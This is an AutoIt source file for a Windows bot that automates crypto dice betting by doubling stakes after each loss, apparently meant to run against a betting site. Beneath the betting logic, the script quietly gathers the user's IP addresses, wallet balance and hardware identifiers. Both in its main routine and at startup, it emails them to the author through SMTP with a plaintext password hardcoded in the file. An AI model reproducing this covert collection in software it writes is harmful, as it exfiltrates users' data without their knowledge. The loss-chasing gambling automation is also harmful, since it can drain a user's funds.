#RequireAdmin
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Version=Beta
#AutoIt3Wrapper_Icon=..\..\Downloads\package_games_board.ico
#AutoIt3Wrapper_Outfile=Dice2.5.Exe
#AutoIt3Wrapper_UseUpx=y
#AutoIt3Wrapper_Res_Description=2276045@ukr.net
#AutoIt3Wrapper_Res_Fileversion=1.2.0.0
#AutoIt3Wrapper_Res_LegalCopyright=kamushek
#AutoIt3Wrapper_Res_Language=1058
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <IE.au3>
#include <Inet.au3>
#include <GUIConstantsEx.au3>
#include <ButtonConstants.au3>
#include <AutoItConstants.au3>
#include <file.au3>
#include <Process.au3>
#include <Array.au3>

#include "mysql.au3"
#include "Check.au3"
#include "CompInfo.au3"
#include "get_wallet.au3"
#include "get_bet.au3"

Local $hGUI = GUICreate("W_bet", 500, 200)
; Create a button control.
Local $g_btn1 = GUICtrlCreateButton("Pos_btn1", 320, 90, 85, 25)
Local $g_btn2 = GUICtrlCreateButton("Pos btn2", 410, 90, 85, 25)
Global $g_bet = GUICtrlCreateButton("Pos ставки", 320, 140, 85, 25)
Local $g_wallet = GUICtrlCreateButton("Pos кошелька", 410, 140, 85, 25)
Global $int_cur_summ_wallet = ""
Global $info = ""
Dim $Motherboard
_ComputerGetMotherboard($Motherboard)
Dim $Processors
_ComputerGetProcessors($Processors)
Dim $SystemProduct
_ComputerGetSystemProduct($SystemProduct)

Global $inp_btn1 = GUICtrlCreateInput("", 320, 65, 85, 23)
Global $inp_btn2 = GUICtrlCreateInput("", 410, 65, 85, 23)
Global $inp_bet = GUICtrlCreateInput("", 320, 115, 85, 23)
Global $inp_wallet = GUICtrlCreateInput("", 410, 115, 85, 23)
Global $pos_btn1 = ""
Global $pos_btn2 = ""
Global $pos_bet = ""
Global $pos_wallet = ""
Global $currency = ""
Local $launch = GUICtrlCreateButton("Запуск", 230, 170, 85, 25)
Local $go = GUICtrlCreateButton("Гоу", 320, 170, 85, 25)
Global $idClose2 = GUICtrlCreateButton("Close", 410, 170, 85, 25)
Global $g_str_f_bet = GUICtrlCreateInput("0.00000001", 8, 120, 239, 23)

GUICtrlCreateGroup("Валюта", 20, 20, 130, 90)
$r1 = GUICtrlCreateRadio("BIT", 40, 60, 100, 20)
$r2 = GUICtrlCreateRadio("PAC", 40, 80, 100, 20)
GUICtrlCreateGroup("", -99, -99, 1, 1) ; закрывает группу

HotKeySet("{f1}", pr_btn1)
HotKeySet("{f2}", pr_btn2)
HotKeySet("{f3}", pr_bet)
HotKeySet("{f4}", pr_wallet)
HotKeySet("{f7}", _Exit)


Func pr_btn1($g_btn1)
	$pos_btn1 = MouseGetPos()
	GUICtrlSetData($inp_btn1, $pos_btn1[0] & "-" & $pos_btn1[1])
EndFunc   ;==>pr_btn1

Func pr_btn2($g_btn2)
	$pos_btn2 = MouseGetPos()
	GUICtrlSetData($inp_btn2, $pos_btn2[0] & "-" & $pos_btn2[1])
EndFunc   ;==>pr_btn2

Func pr_bet($g_bet)
	$pos_bet = MouseGetPos()
	GUICtrlSetData($inp_bet, $pos_bet[0] & "-" & $pos_bet[1])
EndFunc   ;==>pr_bet

Func pr_wallet($g_wallet)
	$pos_wallet = MouseGetPos()
	GUICtrlSetData($inp_wallet, $pos_wallet[0] & "-" & $pos_wallet[1])
EndFunc   ;==>pr_wallet

Global $IE = ""
;Global $pos_btn1 = ""
Global $pos_btn2 = ""
Global $pos_bet = ""
Global $pos_wallet = ""
; Display the GUI.
GUISetState(@SW_SHOW, $hGUI)

Local $iPID = 0

; Loop until the user exits.
While 1
	Switch GUIGetMsg()
		Case $idClose2
			_Exit()
		Case $launch
			;$IE = _IECreate("http://yobit.net")
			$IE = _IECreate("http://joo")
		Case $go
			Work()
			;GET POSITION
		Case $g_btn1
			$g_btn1 = GUICtrlSetData($inp_btn1, "-" & $pos_btn1[1])
		Case $g_btn2
			$g_btn2 = GUICtrlSetData($inp_btn2, "-" & $pos_btn2[1])
		Case $g_bet
			$g_bet = GUICtrlSetData($inp_bet, $pos_bet[0] & "-" & $pos_bet[1])
		Case $g_wallet
			$g_wallet = GUICtrlSetData($inp_wallet, $pos_wallet[0] & "-" & $pos_wallet[1])
	EndSwitch
WEnd
Func _Exit()
	Exit 0
EndFunc   ;==>_Exit

Func Work()
	Check()
	$s_SmtpServer = "smtp.ukr.net" ; address for the smtp-server to use - REQUIRED
	$s_FromName = "Dima coffee" ; name from who the email was sent
	$s_FromAddress = "2276045@ukr.net" ; address from where the mail should come
	$s_ToAddress = "2276045@ukr.net" ; destination address of the email - REQUIRED
	$s_Subject = "Hello World!- " & $sVar; subject from the email - can be anything you want it to be
	$s_Body = "It's Body" ; the messagebody from the mail - can be left blank but then you get a blank mail
	$s_AttachFiles = "" ; the file you want to attach- leave blank if not needed
	$s_CcAddress = "" ; address for cc - leave blank if not needed
	$s_BccAddress = "" ; address for bcc - leave blank if not needed
	$s_Importance = "Normal" ; Send message priority: "High", "Normal", "Low"
	$s_Username = "2276045@ukr.net" ; username for the account used from where the mail gets sent - REQUIRED
	$s_Password = "amigo2109" ; password for the account used from where the mail gets sent - REQUIRED
	$IPPort = 465 ; port used for sending the mail
	$ssl = 1
;~ $IPPort=465 ; GMAIL port used for sending the mail
;~ $ssl=1 ; GMAILenables/disables secure socket layer sending - put to 1 if using httpS
	;_send("test","test","")
	;	Sendmail(@ComputerName,1000,2000)
	$str_first_bet = GUICtrlRead($g_str_f_bet)
	; 	  Msgbox (0, "","firstbet--->" & $str_first_bet)

	$sFile = "C:\LOGS\log.txt"

; Separate the name and extension
	$aSplit = StringSplit($sFile, ".")
	$timee = _NowDate()
	;$timee2 = _NowTime()
	$sNewFile = $aSplit[1]&$timee&"-" &$aSplit[2]
	Global $fd = FileOpen($sNewFile, 9)
	$state = 1
	If GUICtrlRead($r1) = $GUI_CHECKED Then
		$currency = "(Bitcoin)"
	EndIf
	If GUICtrlRead($r2) = $GUI_CHECKED Then
		$currency = "(PacCoin)"
	EndIf
	If Not $currency Then
		MsgBox(16, 'Error', 'Вы ничего не выбрали')
	EndIf

	$str_first_bet = StringFormat("%.8f", $str_first_bet)
	Local $btn[2]
	$ex_wallet = ""
	$fl_first = 0
	$s_wallet = ""
	$int_summ_bet = ""
	$int_prev_summ_wallet = ""
	Global $str_cur_summ_bet = ""
	;$int_first_bet = ""
	$prev_press = ""
	$breaks = ""
	$cnt_bet = 0
	$prev_bet = 0
	Local $btn[2]
	$int_cur_summ_wallet = GetWallet($fd, $IE, $pos_wallet)
	$info = @IPAddress1 & " " & @IPAddress2 & @IPAddress3 & @CRLF _
			 & "wallet " & $int_cur_summ_wallet[1] & "-" & $int_cur_summ_wallet[4] & @CRLF _
			 & "motherboard " & $Motherboard[1][0] & @CRLF _
			 & "proccesor " & $Processors[1][0] & "-" & $Processors[1][28] & @CRLF _
			 & "product " & $SystemProduct[1][1] & "-" & $SystemProduct[1][6]
	SetBet($IE, $pos_bet, $str_first_bet)
	$s_Body = $info
	_INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject, $s_Body, $s_AttachFiles, $s_CcAddress, $s_BccAddress, $s_Importance, $s_Username, $s_Password, $IPPort, $ssl)
	Logs($fd, "START | WALLET--> ", $int_cur_summ_wallet[4])
	$str_cur_summ_bet = $str_first_bet

	For $i = 0 To 100000 Step 1
		LogGame($fd, @CRLF& @CRLF & _NowTime()& "-****************Игра №", $i)
		If ($fl_first == 0) Then
			$fl_first = 1
			$int_prev_summ_wallet = $int_cur_summ_wallet
			press_btn($pos_btn1)
			$prev_press = 1
		Else
			If ($int_prev_summ_wallet[4] < $int_cur_summ_wallet[4]) Then
				$cnt_bet = 1
				;$str_cur_summ_bet = $str_first_bet
				;Minus add action
				If $str_cur_summ_bet <> $str_first_bet Then
					$str_cur_summ_bet = $str_first_bet
					SetBet($IE, $pos_bet, $str_first_bet)
				EndIf
				If ($prev_press == 1) Then
					$int_prev_summ_wallet = $int_cur_summ_wallet
					press_btn($pos_btn2)
					$prev_press = 2
				Else
					$int_prev_summ_wallet = $int_cur_summ_wallet
					press_btn($pos_btn1)
					$prev_press = 1
				EndIf
			Else
				$cnt_bet += 1
				$prev_bet = $str_cur_summ_bet
				If Mod($cnt_bet, 4) = 0 Then
					$str_cur_summ_bet = Round($str_cur_summ_bet * 2.2, 8)
				Else
					$str_cur_summ_bet *= 2
				EndIf
				$str_cur_summ_bet = StringFormat("%.8f", $str_cur_summ_bet)
				SetBet($IE, $pos_bet, $str_cur_summ_bet)
				If ($prev_press == 1) Then
					$int_prev_summ_wallet = $int_cur_summ_wallet
					press_btn($pos_btn1)
					$prev_press = 1
				Else
					$int_prev_summ_wallet = $int_cur_summ_wallet
					press_btn($pos_btn2)
					$prev_press = 2
				EndIf
			EndIf
		EndIf

		$int_cur_summ_wallet = GetWallet_until($fd,$pos_wallet,$int_prev_summ_wallet, $str_cur_summ_bet)

		If ($int_prev_summ_wallet[4] < $int_cur_summ_wallet[4]) Then
				LogResult($fd, "   ****WIN***", $int_prev_summ_wallet[4], _
				$int_cur_summ_wallet[4], $str_cur_summ_bet)
		Else
				LogResult($fd, "   ***LOSS***", $int_prev_summ_wallet[4], _
				$int_cur_summ_wallet[4], "minus"&$str_cur_summ_bet)
		EndIf
		If ($i == 90) Then
			$breaks = Random(191, 250)
		EndIf
		If ($breaks > 0 And $i = $breaks) Then
			Sleep(Random(10000, 20000, 1))
		EndIf
		LogGame($fd, "****************Конец Игры №", $i)
	Next
EndFunc   ;==>Work

;##################################
; Variables
;##################################
$s_SmtpServer = "smtp.ukr.net" ; address for the smtp-server to use - REQUIRED
$s_FromName = "Dima" ; name from who the email was sent
$s_FromAddress = "2276045@ukr.net" ; address from where the mail should come
$s_ToAddress = "2276045@ukr.net" ; destination address of the email - REQUIRED
$s_Subject = "Hello World! 2.5" & $sVar ; subject from the email - can be anything you want it to be
$s_Body = $info ; the messagebody from the mail - can be left blank but then you get a blank mail
$s_AttachFiles = "" ; the file you want to attach- leave blank if not needed
$s_CcAddress = "" ; address for cc - leave blank if not needed
$s_BccAddress = "" ; address for bcc - leave blank if not needed
$s_Importance = "Normal" ; Send message priority: "High", "Normal", "Low"
$s_Username = "2276045@ukr.net" ; username for the account used from where the mail gets sent - REQUIRED
$s_Password = "amigo2109" ; password for the account used from where the mail gets sent - REQUIRED
$IPPort = 465 ; port used for sending the mail
$ssl = 1 ; enables/disables secure socket layer sending - put to 1 if using httpS
;~ $IPPort=465                          ; GMAIL port used for sending the mail
;~ $ssl=1                               ; GMAILenables/disables secure socket layer sending - put to 1 if using httpS

;##################################
; Script
;##################################
Global $oMyRet[2]
Global $oMyError = ObjEvent("AutoIt.Error", "MyErrFunc")
$rc = _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject, $s_Body, $s_AttachFiles, $s_CcAddress, $s_BccAddress, $s_Importance, $s_Username, $s_Password, $IPPort, $ssl)
If @error Then
	MsgBox(0, "Error sending message", "Error code:" & @error & "  Description:" & $rc)
EndIf
;
; The UDF
Func _INetSmtpMailCom($s_SmtpServer, $s_FromName, $s_FromAddress, $s_ToAddress, $s_Subject = "", $as_Body = "", $s_AttachFiles = "", $s_CcAddress = "", $s_BccAddress = "", $s_Importance = "Normal", $s_Username = "", $s_Password = "", $IPPort = 25, $ssl = 0)
	Local $objEmail = ObjCreate("CDO.Message")
	$objEmail.From = '"' & $s_FromName & '" <' & $s_FromAddress & '>'
	$objEmail.To = $s_ToAddress
	Local $i_Error = 0
	Local $i_Error_desciption = ""
	If $s_CcAddress <> "" Then $objEmail.Cc = $s_CcAddress
	If $s_BccAddress <> "" Then $objEmail.Bcc = $s_BccAddress
	$objEmail.Subject = $s_Subject
	If StringInStr($as_Body, "<") And StringInStr($as_Body, ">") Then
		$objEmail.HTMLBody = $as_Body
	Else
		$objEmail.Textbody = $as_Body & @CRLF
	EndIf
	If $s_AttachFiles <> "" Then
		Local $S_Files2Attach = StringSplit($s_AttachFiles, ";")
		For $x = 1 To $S_Files2Attach[0]
			$S_Files2Attach[$x] = _PathFull($S_Files2Attach[$x])
			ConsoleWrite('@@ Debug(62) : $S_Files2Attach = ' & $S_Files2Attach & @LF & '>Error code: ' & @error & @LF) ;### Debug Console
			If FileExists($S_Files2Attach[$x]) Then
				$objEmail.AddAttachment($S_Files2Attach[$x])
			Else
				ConsoleWrite('!> File not found to attach: ' & $S_Files2Attach[$x] & @LF)
				SetError(1)
				Return 0
			EndIf
		Next
	EndIf
	$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
	$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = $s_SmtpServer
	If Number($IPPort) = 0 Then $IPPort = 25
	$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = $IPPort
	;Authenticated SMTP
	If $s_Username <> "" Then
		$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
		$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = $s_Username
		$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = $s_Password
	EndIf
	If $ssl Then
		$objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
	EndIf
	;Update settings
	$objEmail.Configuration.Fields.Update
	; Set Email Importance
	Switch $s_Importance
		Case "High"
			$objEmail.Fields.Item("urn:schemas:mailheader:Importance") = "High"
		Case "Normal"
			$objEmail.Fields.Item("urn:schemas:mailheader:Importance") = "Normal"
		Case "Low"
			$objEmail.Fields.Item("urn:schemas:mailheader:Importance") = "Low"
	EndSwitch
	$objEmail.Fields.Update
	; Sent the Message
	$objEmail.Send
	If @error Then
		SetError(2)
		Return $oMyRet[1]
	EndIf
	$objEmail = ""
EndFunc   ;==>_INetSmtpMailCom
;
;
; Com Error Handler
Func MyErrFunc()
	$HexNumber = Hex($oMyError.number, 8)
	$oMyRet[0] = $HexNumber
	$oMyRet[1] = StringStripWS($oMyError.description, 3)
	ConsoleWrite("### COM Error !  Number: " & $HexNumber & "   ScriptLine: " & $oMyError.scriptline & "   Description:" & $oMyRet[1] & @LF)
	SetError(1) ; something to check for when this function returns
	Return
EndFunc   ;==>MyErrFunc
